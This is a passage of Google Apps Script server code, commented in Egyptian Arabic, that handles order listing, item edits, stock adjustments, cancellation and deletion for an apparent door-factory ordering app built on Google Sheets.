        // للمحاولات عشان حد ما يقعدش يجرّب أرقام واحد ورا التاني
        isAdmin = isAdminPwQuiet_(e.parameter.pw);
        if (!isAdmin && !rateOk_('listPhone', e.parameter.dev)) {
          return reply({ ok: false, error: RATE_MSG_ }, cb);
        }
      } else {
        // مفيش رقم موبايل = محاولة دخول شاشة المصنع؛ لازم تعدي بوابة الحماية من التخمين
        if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) return reply({ ok: false, error: adminPwError_() }, cb);
        isAdmin = true;
      }
      var phone = isAdmin ? '' : digitsOnly_((e.parameter.phone || ''));
      var sh = sheet_(SHEET_ORDERS, HEAD_ORDERS);
      var rows = readOrderRows_(sh);   // بيتخطى أعمدة Message وPricing Terms التقيلة
      var out = [];

      for (var i = 0; i < rows.length; i++) {
        var rowPhone = digitsOnly_(rows[i][4] || '');

        // لو التطبيق بعت رقم، بنرجّع طلبات الرقم ده بس.
        // بنقارن بآخر ٩ أرقام عشان الصفر البادئ وكود الدولة ما يفرقوش.
        if (phone) {
          var a = phone.slice(-9), b = rowPhone.slice(-9);
          if (!a || a !== b) continue;
        }

        // فلترة الأرشيف — للمصنع بس (العميل بيشوف كل طلباته دايمًا مهما كانت مؤرشفة).
        // من غير ?archived=1: بيرجع النشط بس. مع ?archived=1: بيرجع المؤرشف بس.
        if (isAdmin) {
          var isArch = String(rows[i][COL_ARCHIVED - 1] || '') === 'Y';
          var wantArch = String(e.parameter.archived || '') === '1';
          if (isArch !== wantArch) continue;
        }

        out.push({
          id:     rows[i][0],
          date:   fmtDate_(rows[i][1]),
          dist:   rows[i][3],
          phone:  isAdmin ? String(rows[i][4] || '').replace(/^'/, '') : '',
          region: rows[i][5],
          qty:    rows[i][7],
          rods:   rows[i][8],
          total:  rows[i][9],
          status: rows[i][10],
          note:   rows[i][11],      // ملاحظة المصنع للموزع
          customer: rows[i][COL_CUSTOMER - 1] || '',
          customerPhone: isAdmin ? String(rows[i][COL_CUST_PHONE - 1] || '').replace(/^'/, '') : '',
          customerRegion: rows[i][COL_CUST_REGION - 1] || '',
          artCompletedAt: artDateMs_(rows[i][COL_ART_COMPLETED-1]),
          artPurgedAt: artDateMs_(rows[i][COL_ART_PURGED-1]),
          ordNote:  rows[i][COL_ORDNOTE  - 1] || '',
          replacesId: rows[i][COL_REPLACES - 1] || '',
          displayNo: rows[i][COL_DISPLAY_NO - 1] || '',
          editCount: rows[i][COL_EDIT_COUNT - 1] || 0,
          editedAt: fmtDate_(rows[i][COL_EDITED_AT - 1]),
          due: fmtDate_(rows[i][COL_DUE - 1]),   // ميعاد التسليم (فاضي للطلبات القديمة)
          // آخر تحديث للحالة — لما الطلب يتسلّم بيتأرشف أوتوماتيك في نفس اللحظة، فده هو «يوم الأرشفة» اللي بيتعرض في الأرشيف
          updated: isAdmin ? fmtDate_(rows[i][COL_UPDATED - 1]) : '',
          // ⚠️ علامة «الطلب ده اتعدّل وعنده نسخة جديدة» كانت بتتكتب في الشيت
          // وخلاص — عمرها ما رجعت للتطبيق. فالمصنع كان بيشوف الطلب القديم
          // والجديد جنب بعض في شاشته من غير أي تفسير، ومش عارف إن المفروض
          // يحذف القديم. دلوقتي بترجع وبتتعرض عليه صراحة.
          superseded: isAdmin ? String(rows[i][COL_SUPERSEDED - 1] || '') : '',
          archived: isAdmin ? (String(rows[i][COL_ARCHIVED - 1] || '') === 'Y') : undefined
        });
      }
      if (phone && !isAdmin) return reply({ ok: true, orders: out, deleted: readDeleted327_(phone.slice(-9)) }, cb);
      return reply({ ok: true, orders: out }, cb);
    }

    // قايمة أصناف طلب واحد بالتفصيل — لشاشة المصنع بس (لعرض/تعديل التوفر ولتصدير PDF)
    if (action === 'orderItems') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var shOI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
      // ⚠️ المعاينة وتصدير طلبات عميل كانوا بينادوا الأكشن ده مرة لكل طلب.
      // Apps Script بينفّذ نداءات نفس المستخدم واحد ورا التاني، فعميل عنده
      // ١٠ طلبات = ١٠ تنفيذات متسلسلة، كل واحد بيفتح الشيت من الأول.
      // دلوقتي ينفع تبعت أكتر من معرّف في نداء واحد (ids=a,b,c) ونرجّعهم
      // كلهم مع بعض من قراية واحدة.
      var idsParam = String(e.parameter.ids || '').trim();
      if (idsParam) {
        var wantOM = [];
        var partsOM = idsParam.split(',');
        for (var kOM = 0; kOM < partsOM.length; kOM++) {
          var oneOM = String(partsOM[kOM]).trim();
          if (oneOM && wantOM.indexOf(oneOM) < 0) wantOM.push(oneOM);
        }
        var mapOM = itemRowsForMany_(shOI, wantOM);
        var byIdOM = {};
        for (var nOM = 0; nOM < wantOM.length; nOM++) {
          byIdOM[wantOM[nOM]] = itemsFromRows_(mapOM[wantOM[nOM]].rows);
        }
        return reply({ ok: true, itemsById: byIdOM }, cb);
      }
      var idOI = String(e.parameter.id || '');
      return reply({ ok: true, items: itemsFromRows_(itemRowsFor_(shOI, idOI).rows) }, cb);
    }


    // تحديد صنف معيّن جوه طلب كـ"غير متاح" أو رجّعه "متاح" — بالـ idx (ترتيبه جوه الطلب، يبدأ من صفر)
    if (action === 'setItemAvail') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockIA = LockService.getScriptLock();
      try {
        lockIA.waitLock(15000);
        var shIA = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idIA = String(e.parameter.id || '');
        var idxIA = Number(e.parameter.idx || 0);
        var lastIA = shIA.getLastRow();
        if (lastIA < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsIA = shIA.getRange(2, 1, lastIA - 1, 1).getValues();
        var foundIA = -1, countIA = -1;
        for (var iIA = 0; iIA < idsIA.length; iIA++) {
          if (String(idsIA[iIA][0]) === idIA) {
            countIA++;
            if (countIA === idxIA) { foundIA = iIA + 2; break; }
          }
        }
        if (foundIA < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
        var rowIA = shIA.getRange(foundIA, 1, 1, HEAD_ITEMS.length).getValues()[0];
        if (!itemMatches_(rowIA, e)) return reply({ ok: false, error: ITEM_MOVED_ERR_ }, cb);
        shIA.getRange(foundIA, COL_ITEM_AVAIL).setValue(String(e.parameter.avail) === '1' ? 'Y' : 'N');
        return reply({ ok: true }, cb);
      } finally {
        try { lockIA.releaseLock(); } catch (eIA) {}
      }
    }

    // تحديث الكمية المنتجة فعليًا لصنف معيّن جوه طلب (تتبّع الإنتاج الجزئي) — نفس منطق setItemAvail بالظبط
    // تعديل الكمية المطلوبة لصنف معيّن جوه طلب (يدوي من شاشة المصنع، من غير ما يفتح "طلب جديد")
    // بيحدّث سطر الصنف (الكمية + الإجمالي) وبعدين بيعيد حساب إجماليات الطلب كله (كمية/عيدان/مبلغ)
    // تعديل بيانات الطلب الأساسية (اسم صاحب الأوردر / التاريخ) — يدوي من شاشة المصنع، من غير ما تفتح "طلب جديد"
    if (action === 'setOrderMeta') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockOM = LockService.getScriptLock();
      try {
        lockOM.waitLock(15000);
        var shOM = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var rOM = findRow_(shOM, e.parameter.id);
        if (rOM < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        if (e.parameter.customer !== undefined) {
          shOM.getRange(rOM, COL_CUSTOMER).setValue(sanitizeCell_(e.parameter.customer || ''));
        }
        if (e.parameter.customerRegion !== undefined) {
          shOM.getRange(rOM, COL_CUST_REGION).setValue(sanitizeCell_(e.parameter.customerRegion || ''));
        }
        if (e.parameter.date) {
          // ⚠️ كان بيعمل new Date('2026-09-08T00:00:00') وبعدين يفرمته بتوقيت
          // القاهرة. لكن new Date على نص بيتقري **بتوقيت مشروع الأبس سكريبت**،
          // اللي مش بالضرورة توقيت القاهرة. لو توقيت المشروع مقدّم عن القاهرة
          // (مثلاً طوكيو) التاريخ كان بيرجع يوم لورا: المصنع يكتب ٨/٩ ويتخزّن ٧/٩.
          // التاريخ أصلًا جايلنا بالشكل الصح (yyyy-MM-dd)، فبنتأكد من شكله
          // وبنكتبه زي ما هو — من غير أي تحويل توقيت.
          var dTxtOM = String(e.parameter.date).trim();
          if (!/^\d{4}-\d{2}-\d{2}$/.test(dTxtOM)) {
            return reply({ ok: false, error: 'شكل التاريخ مش صحيح' }, cb);
          }
          var pOM = dTxtOM.split('-');
          var mOM = Number(pOM[1]), dayOM = Number(pOM[2]);
          if (mOM < 1 || mOM > 12 || dayOM < 1 || dayOM > 31) {
            return reply({ ok: false, error: 'شكل التاريخ مش صحيح' }, cb);
          }
          shOM.getRange(rOM, COL_DATE).setValue(dTxtOM);
        }
        if (e.parameter.due !== undefined) {
          // ميعاد التسليم: فاضي = مسح الميعاد، غير كده لازم yyyy-MM-dd صحيح
          var dueTxtOM = String(e.parameter.due).trim();
          if (dueTxtOM !== '' && !cleanIsoDate_(dueTxtOM)) {
            return reply({ ok: false, error: 'شكل ميعاد التسليم مش صحيح' }, cb);
          }
          shOM.getRange(rOM, COL_DUE).setValue(dueTxtOM);
        }
        return reply({ ok: true, id: e.parameter.id,
          due: fmtDate_(shOM.getRange(rOM, COL_DUE).getValue()),
          customer: shOM.getRange(rOM, COL_CUSTOMER).getValue(),
          customerRegion: shOM.getRange(rOM, COL_CUST_REGION).getValue(),
          date: fmtDate_(shOM.getRange(rOM, COL_DATE).getValue()) }, cb);
      } finally {
        try { lockOM.releaseLock(); } catch (eOM) {}
      }
    }

    // ميعاد التسليم لمجموعة طلبات مرة واحدة (تحديد مواعيد الطلبات القديمة) — من شاشة المصنع.
    // payload = JSON: [{id:'...', due:'yyyy-MM-dd'}, ...] — الحد الأقصى ٤٠ في النداء.
    if (action === 'setDueBatch') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockDB = LockService.getScriptLock();
      try {
        lockDB.waitLock(20000);
        var listDB = JSON.parse(String(e.parameter.payload || '[]'));
        if (!listDB || !listDB.length || listDB.length > 40) {
          return reply({ ok: false, error: 'عدد الطلبات غير مسموح' }, cb);
        }
        var shDB = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var lastDB = shDB.getLastRow();
        var idsDB = lastDB > 1 ? shDB.getRange(2, 1, lastDB - 1, 1).getValues() : [];
        var rowOf = {};
        for (var iDB = 0; iDB < idsDB.length; iDB++) rowOf[String(idsDB[iDB][0])] = iDB + 2;
        var doneDB = 0;
        for (var jDB = 0; jDB < listDB.length; jDB++) {
          var dueDB = cleanIsoDate_(listDB[jDB].due);
          var rDB = rowOf[String(listDB[jDB].id)];
          if (!dueDB || !rDB) continue;
          shDB.getRange(rDB, COL_DUE).setValue(dueDB);
          doneDB++;
        }
        return reply({ ok: true, saved: doneDB }, cb);
      } finally {
        try { lockDB.releaseLock(); } catch (eDB) {}
      }
    }

    if (action === 'setItemQty') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockIQ = LockService.getScriptLock();
      try {
        lockIQ.waitLock(15000);
        var shIQ = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idIQ = String(e.parameter.id || '');
        var idxIQ = Number(e.parameter.idx || 0);
        var newQtyIQ = Number(e.parameter.qty);
        if (!newQtyIQ || newQtyIQ < 1) return reply({ ok: false, error: 'الكمية لازم تكون رقم أكبر من صفر' }, cb);
        var lastIQ = shIQ.getLastRow();
        if (lastIQ < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsIQ = shIQ.getRange(2, 1, lastIQ - 1, 1).getValues();
        var foundIQ = -1, countIQ = -1;
        for (var iIQ = 0; iIQ < idsIQ.length; iIQ++) {
          if (String(idsIQ[iIQ][0]) === idIQ) {
            countIQ++;
            if (countIQ === idxIQ) { foundIQ = iIQ + 2; break; }
          }
        }
        if (foundIQ < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
        // ⚠️ كان بيقرا خانتين بنداءين، وبيكتب تلات خانات بتلات نداءات، وبيقرا
        // الصف تاني في stockItemFromRow_ — ٦ نداءات لـ Sheets على تعديل كمية
        // واحدة. دلوقتي: قراية واحدة للصف كله، وكتابة واحدة للمدى ١١..١٩.
        var rowRngIQ = shIQ.getRange(foundIQ, 1, 1, HEAD_ITEMS.length);
        var rowIQ = rowRngIQ.getValues()[0];
        if (!itemMatches_(rowIQ, e)) return reply({ ok: false, error: ITEM_MOVED_ERR_ }, cb);
        var unitPriceIQ = Number(rowIQ[11]) || 0;                      // عمود Unit Price
        var producedIQ = Number(rowIQ[COL_ITEM_PRODUCED - 1]) || 0;
        if (producedIQ > newQtyIQ) producedIQ = newQtyIQ;   // ميفضلش "جاهز" أكبر من "مطلوب" بعد التعديل

        // ⚠️ باج كان هنا: الكمية بتتغيّر والرصيد ما بيتعدّلش خالص. يعني لو المصنع
        // عدّل صنف من 5 أبواب لـ 2، التلاتة الباقيين بيفضلوا مخصومين من المخزن
        // للأبد (الرصيد يبان أقل من الحقيقة). والعكس لو زوّد الكمية.
        // بنعدّل الرصيد بالفرق: القديم ناقص الجديد.
        var stkIQ = stockItemFromValues_(rowIQ);
        if (stkIQ && orderStatus_(idIQ) !== 'Delivered') {
          var diffIQ = stkIQ.qty - newQtyIQ;          // موجب = نرجّع للمخزن، سالب = نخصم زيادة
          if (diffIQ) adjustStockForItems_([{ kind:'door', code:stkIQ.code, w:stkIQ.w, qty:Math.abs(diffIQ) }],
                                           diffIQ > 0 ? +1 : -1);
        }

        rowIQ[10] = newQtyIQ;                              // Qty
        rowIQ[12] = unitPriceIQ * newQtyIQ;                // Line Total
        rowIQ[COL_ITEM_PRODUCED - 1] = producedIQ;
        var receivedIQ = Math.min(newQtyIQ, Number(rowIQ[COL_ITEM_RECEIVED - 1]) || 0);   // المستلم كمان مايزيدش عن المطلوب
        rowIQ[COL_ITEM_RECEIVED - 1] = receivedIQ;
        rowRngIQ.setValues([rowIQ]);
        var cutIQ = syncCutRows_(shIQ, idIQ);   // كمية بند القص تمشي مع كمية الباب
        var totalsIQ = recomputeOrderTotals_(idIQ);
        return reply({ ok: true, qty: newQtyIQ, produced: producedIQ, received: receivedIQ, totals: totalsIQ,
                       cutChanged: cutIQ > 0 }, cb);
      } finally {
        try { lockIQ.releaseLock(); } catch (eIQ) {}
      }
    }

    // حذف صنف واحد بس من طلب (يدوي من شاشة المصنع) وإعادة حساب إجماليات الطلب
    if (action === 'deleteOrderItem') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockDI = LockService.getScriptLock();
      try {
        lockDI.waitLock(15000);
        var shDI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idDI = String(e.parameter.id || '');
        var idxDI = Number(e.parameter.idx || 0);
        var lastDI = shDI.getLastRow();
        if (lastDI < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsDI = shDI.getRange(2, 1, lastDI - 1, 1).getValues();
        var foundDI = -1, countDI = -1;
        for (var iDI = 0; iDI < idsDI.length; iDI++) {
          if (String(idsDI[iDI][0]) === idDI) {
            countDI++;
            if (countDI === idxDI) { foundDI = iDI + 2; break; }
          }
        }
        if (foundDI < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
        var rowDI = shDI.getRange(foundDI, 1, 1, HEAD_ITEMS.length).getValues()[0];
        if (!itemMatches_(rowDI, e)) return reply({ ok: false, error: ITEM_MOVED_ERR_ }, cb);

        // ⚠️ باج كان هنا: الصنف بيتحذف والرصيد ما بيرجعش. يعني حذف صنف فيه 5 أبواب
        // كان بيسيبهم مخصومين من المخزن للأبد. بنرجّعهم قبل ما نمسح الصف.
        // (زي حذف الطلب كله بالظبط — المُسلَّم فعليًا ميترجّعش رصيده)
        var stkDI = stockItemFromRow_(shDI, foundDI);
        if (stkDI && orderStatus_(idDI) !== 'Delivered') adjustStockForItems_([stkDI], +1);

        shDI.deleteRow(foundDI);
        var cutDI = syncCutRows_(shDI, idDI);   // بند القص يتشال/ينقص مع الباب
        var totalsDI = recomputeOrderTotals_(idDI);
        return reply({ ok: true, totals: totalsDI, cutChanged: cutDI > 0 }, cb);
      } finally {
        try { lockDI.releaseLock(); } catch (eDI) {}
      }
    }

    if (action === 'setItemProduced') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockIP = LockService.getScriptLock();
      try {
        lockIP.waitLock(15000);
        var shIP = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idIP = String(e.parameter.id || '');
        var idxIP = Number(e.parameter.idx || 0);
        var lastIP = shIP.getLastRow();
        if (lastIP < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsIP = shIP.getRange(2, 1, lastIP - 1, 1).getValues();
        var foundIP = -1, countIP = -1;
        for (var iIP = 0; iIP < idsIP.length; iIP++) {
          if (String(idsIP[iIP][0]) === idIP) {
            countIP++;
            if (countIP === idxIP) { foundIP = iIP + 2; break; }
          }
        }
        if (foundIP < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
        var rowIP = shIP.getRange(foundIP, 1, 1, HEAD_ITEMS.length).getValues()[0];
        if (!itemMatches_(rowIP, e)) return reply({ ok: false, error: ITEM_MOVED_ERR_ }, cb);
        var qtyIP = Number(rowIP[10]) || 0;   // عمود Qty
        var producedIP = Math.max(0, Math.min(qtyIP, Number(e.parameter.produced) || 0));  // من صفر لحد الكمية المطلوبة، مش أكتر ولا أقل
        shIP.getRange(foundIP, COL_ITEM_PRODUCED).setValue(producedIP);
        return reply({ ok: true, produced: producedIP }, cb);
      } finally {
        try { lockIP.releaseLock(); } catch (eIP) {}
      }
    }




    // تسجيل الكمية اللي العميل استلمها فعلًا من صنف (من صفر لحد الكمية المطلوبة).
    // مستقل عن «الجاهز»: الجاهز = اتصنّع، المستلم = خرج للعميل. التقارير بتحسب على المتبقي.
    if (action === 'setItemReceived') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockIR = LockService.getScriptLock();
      try {
        lockIR.waitLock(15000);
        var shIR = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idIR = String(e.parameter.id || '');
        var idxIR = Number(e.parameter.idx || 0);
        var lastIR = shIR.getLastRow();
        if (lastIR < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsIR = shIR.getRange(2, 1, lastIR - 1, 1).getValues();
        var foundIR = -1, countIR = -1;
        for (var iIR = 0; iIR < idsIR.length; iIR++) {
          if (String(idsIR[iIR][0]) === idIR) {
            countIR++;
            if (countIR === idxIR) { foundIR = iIR + 2; break; }
          }
        }
        if (foundIR < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
        var rowIR = shIR.getRange(foundIR, 1, 1, HEAD_ITEMS.length).getValues()[0];
        if (!itemMatches_(rowIR, e)) return reply({ ok: false, error: ITEM_MOVED_ERR_ }, cb);
        var qtyIR = Number(rowIR[10]) || 0;   // عمود Qty
        var receivedIR = Math.max(0, Math.min(qtyIR, Math.round(Number(e.parameter.received) || 0)));
        shIR.getRange(foundIR, COL_ITEM_RECEIVED).setValue(receivedIR);
        return reply({ ok: true, received: receivedIR }, cb);
      } finally {
        try { lockIR.releaseLock(); } catch (eIR) {}
      }
    }


    // إلغاء طلب (بيتنادى لوحده لما العميل أو المصنع يعدّل طلب — الطلب القديم يتحذف تلقائي وطلب جديد يتعمل)
    // من غير كلمة سر المصنع عشان الموزع العادي يقدر يعدّل طلبه هو من غير دخول شاشة المصنع،
    // لكن لازم يبعت نفس رقم موبايل صاحب الطلب — عشان حد تاني ميقدرش يلغي طلب مش بتاعه بمجرد ما يعرف رقمه
    if (action === 'cancelOrder') {
      var lockCO = LockService.getScriptLock();
      try {
        lockCO.waitLock(15000);
        var shCO = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var rCO = findRow_(shCO, e.parameter.id);
        if (rCO < 0) {
          // السطر الملخّص مش موجود — يا إما اتمسح خلاص، يا إما نداء إلغاء سابق
          // وقف في نصه وساب سطور الأصناف يتيمة في الشيت. بننضّفها هنا (سطور
          // مالهاش طلب أصلاً، ومفيش حاجة تتفتح عليها) والرد زي ما هو.
          clearItemRows_(sheet_(SHEET_ITEMS, HEAD_ITEMS), e.parameter.id);
          return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        }

        var isAdminCO = isAdminPwQuiet_(e.parameter.pw);   // المستخدم العادي بيلغي طلبه برقم موبايله، مش بكلمة سر
        if (!isAdminCO && !rateOk_('cancelOrder', e.parameter.dev)) {
          return reply({ ok: false, error: RATE_MSG_ }, cb);
        }
        if (!isAdminCO) {
          var ownerPhoneCO = digitsOnly_(shCO.getRange(rCO, COL_PHONE).getValue() || '');   // digitsOnly_ بتشيل الفاصلة العليا كمان
          var reqPhoneCO = digitsOnly_(e.parameter.phone || '');
          if (!reqPhoneCO || reqPhoneCO.slice(-9) !== ownerPhoneCO.slice(-9)) {
            return reply({ ok: false, error: 'مش مسموح تلغي الطلب ده' }, cb);
          }
        }

        // المصنع (بكلمة السر) يقدر يمسح الطلب القديم مهما كانت حالته — هو اللي بيعدّل بنفسه.
        // الموزع العادي (من غير كلمة سر) لسه ممنوع يلغي طلب دخل التنفيذ فعليًا — بدل ما نسيبه
        // كإنه طلب عادي، بنحط عليه علامة واضحة في العمود الأخير + نلوّن السطر عشان المصنع
        // ياخد باله وهو بيراجع الشيت إن ده طلب قديم اتعدّله موزع وعنده نسخة جديدة، ويحذفه بنفسه.
        var stCO = String(shCO.getRange(rCO, COL_STATUS).getValue() || '');
        if (!isAdminCO && (stCO === 'In Progress' || stCO === 'Ready' || stCO === 'Delivered')) {
          var newIdCO = String(e.parameter.newId || '');
          var markCO = '⚠️ الطلب ده اتعدّل — بدّله الطلب رقم #' + (newIdCO || '؟') + ' — من فضلك احذف السطر ده يدويًا';
          shCO.getRange(rCO, COL_SUPERSEDED).setValue(markCO);
          shCO.getRange(rCO, 1, 1, HEAD_ORDERS.length).setBackground('#FFF3CD');
          return reply({ ok: false, error: 'الطلب دخل التنفيذ في المصنع، اتحطت عليه علامة "معدّل" عشان يتحذف يدويًا', marked: true }, cb);
        }
        shCO.deleteRow(rCO);
        // المُسلَّم فعليًا ميترجّعش رصيده. والملغي رصيده رجع خلاص وقت ما اتلغى
        // (setStatus بيرجّعه) — فلو رجّعناه تاني هنا الرصيد هيزيد على الحقيقة
        // والمصنع يبيع حاجة مش موجودة.
        if (stCO !== 'Delivered' && stCO !== 'Cancelled') restoreStockForOrderId_(e.parameter.id);
        var shICO = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        clearItemRows_(shICO, e.parameter.id);
        return reply({ ok: true, id: e.parameter.id }, cb);
      } finally {
        try { lockCO.releaseLock(); } catch (eCO) {}
      }
    }

    // حذف طلب بالكامل (السطر الملخّص + كل سطور أصنافه) — من شاشة المصنع
    if (action === 'deleteOrder') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockDO = LockService.getScriptLock();
      try {
        lockDO.waitLock(15000);
        var shDO = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var rDO = findRow_(shDO, e.parameter.id);
        // ⚠️ باج كان بيخلّي الحذف "يعلّق" والسطور تفضل في الشيت:
        // الحذف بيمسح السطر الملخّص الأول وبعدين سطور الأصناف. لو النداء وقف في
        // النص (مهلة جوجل، النت قطع، الموزع قفل الشاشة) بيبقى السطر الملخّص
        // اتمسح وسطور الأصناف فاضلة. أول ما المصنع يضغط حذف تاني كان الرد
        // "الطلب مش موجود" — يعني سطور الأصناف تفضل في الشيت للأبد، والسطر
        // في الشاشة ما بيختفيش (التطبيق بيشيله بس لما الرد يبقى ok).
        // دلوقتي الحذف بقى *مُعاد التنفيذ بأمان*: السطر الملخّص مش موجود؟
        // يبقى اتمسح قبل كده (ورصيده رجع قبل كده) — نكمّل تنظيف الأصناف ونرد ok.
        var stDO = rDO > 0 ? String(shDO.getRange(rDO, COL_STATUS).getValue() || '') : '';
        var phDO = rDO > 0 ? String(shDO.getRange(rDO, 5).getValue() || '') : '';
        if (rDO > 0) {
          shDO.deleteRow(rDO);
          recordDeleted327_([[e.parameter.id, phDO]]);
          // زي cancelOrder: المسلَّم مالوش رصيد يرجع، والملغي رصيده رجع قبل كده
          if (stDO !== 'Delivered' && stDO !== 'Cancelled') restoreStockForOrderId_(e.parameter.id);
        }
        var shIDO = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var nDO = clearItemRows_(shIDO, e.parameter.id);
        // مفيش سطر ملخّص ولا سطر صنف؟ يبقى الطلب أصلاً مش في الشيت
        if (rDO < 0 && !nDO) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        return reply({ ok: true, id: e.parameter.id, alreadyGone: rDO < 0 }, cb);
      } finally {
        try { lockDO.releaseLock(); } catch (eDO) {}
      }
    }

    // مسح كل الطلبات اللي حالتها "تم التسليم" دفعة واحدة (تنظيف دوري) — من زرار "🗑️ مسح المسلّم"
    if (action === 'deleteDelivered') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockDD = LockService.getScriptLock();
      try {
        lockDD.waitLock(15000);
        var shDD = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var lastDD = shDD.getLastRow();
        var deletedIds = [], deletedPairs327 = [];
        if (lastDD >= 2) {
          var valsDD = shDD.getRange(2, 1, lastDD - 1, HEAD_ORDERS.length).getValues();
          // من الآخر للأول عشان مسح صف ميغيّرش أرقام الصفوف اللي لسه هنمسحها،
          // وبالكتل المتجاورة بدل صف صف (نداء واحد بدل عشرات)
          var iDD = valsDD.length - 1;
          while (iDD >= 0) {
            if (String(valsDD[iDD][COL_STATUS - 1]) !== 'Delivered') { iDD--; continue; }
            var endDD = iDD;
            while (iDD >= 0 && String(valsDD[iDD][COL_STATUS - 1]) === 'Delivered') {
              deletedIds.push(String(valsDD[iDD][0]));
              deletedPairs327.push([String(valsDD[iDD][0]), String(valsDD[iDD][4] || '')]);
              iDD--;
            }
            var startDD = iDD + 1;
            shDD.deleteRows(startDD + 2, endDD - startDD + 1);
          }
        }
        var shIDD = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        if (deletedIds.length) clearItemRowsMany_(shIDD, deletedIds);
        recordDeleted327_(deletedPairs327);
        return reply({ ok: true, count: deletedIds.length, ids: deletedIds }, cb);
      } finally {
        try { lockDD.releaseLock(); } catch (eDD) {}
      }
    }

    // كل الطلبات + أصنافها مرة واحدة — لتقرير الـ PDF الشامل في شاشة المصنع (بدل ما نجيب كل طلب لوحده)
    if (action === 'listWithItems') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var shLW = sheet_(SHEET_ORDERS, HEAD_ORDERS);
      var rowsLW = readOrderRows_(shLW);   // نفس الحكاية — من غير الأعمدة التقيلة
      // ⚠️ الأصناف كانت بتتجمّع لكل طلب في الشيت — حتى الطلبات المؤرشفة اللي
      // التقرير أصلًا بيستبعدها. يعني بناء وذاكرة على الفاضي بيكبروا مع كل طلب
      // قديم. دلوقتي بنحدّد الطلبات المطلوبة الأول ونجمّع أصنافها هي بس.
      // نفس القاعدة القديمة بالظبط: من غير archived=1 بنستبعد المؤرشف،
      // ومع archived=1 بنرجّع كل حاجة.
      var wantLW = {};
      var withArchLW = String(e.parameter.archived || '') === '1';
      for (var kLW = 0; kLW < rowsLW.length; kLW++) {
        var archLW = String(rowsLW[kLW][COL_ARCHIVED - 1] || '') === 'Y';
        if (archLW && !withArchLW) continue;
        wantLW[String(rowsLW[kLW][0])] = true;
      }
      var shILW = sheet_(SHEET_ITEMS, HEAD_ITEMS);
      var lastILW = shILW.getLastRow();
      var itemsByIdLW = {};
      if (lastILW >= 2) {
        var valsILW = shILW.getRange(2, 1, lastILW - 1, HEAD_ITEMS.length).getValues();
        for (var iILW = 0; iILW < valsILW.length; iILW++) {
          var oidLW = String(valsILW[iILW][0]);
          if (!wantLW[oidLW]) continue;              // طلب مش في التقرير — مالوش لازمة
          if (!itemsByIdLW[oidLW]) itemsByIdLW[oidLW] = [];
          itemsByIdLW[oidLW].push({
            type:     valsILW[iILW][3],
            title:    valsILW[iILW][4],
            code:     valsILW[iILW][5],
            size:     valsILW[iILW][6],
            included: valsILW[iILW][7],
            unit:     valsILW[iILW][9],
            qty:      valsILW[iILW][10],
            avail:    valsILW[iILW][13] !== 'N',
            frame:    valsILW[iILW][14] || '',
            dbror:    valsILW[iILW][15] || '',
            frameHeight: valsILW[iILW][16] || '',
            width:    valsILW[iILW][17] || '',
            produced: Number(valsILW[iILW][18]) || 0,
            doorHeight: valsILW[iILW][19] || '',
            milling:  valsILW[iILW][8],
            forDoorWidth: valsILW[iILW][20] || '',
            itemNote: valsILW[iILW][21] || '',
            received: Number(valsILW[iILW][24]) || 0,   // «المستلم» (COL_ITEM_RECEIVED)
            printArt: valsILW[iILW][22]||'',
            engraveArt: valsILW[iILW][23]||'',
          });
        }
      }
      var outLW = [];
      for (var jLW = 0; jLW < rowsLW.length; jLW++) {
        var isArchLW = String(rowsLW[jLW][COL_ARCHIVED - 1] || '') === 'Y';
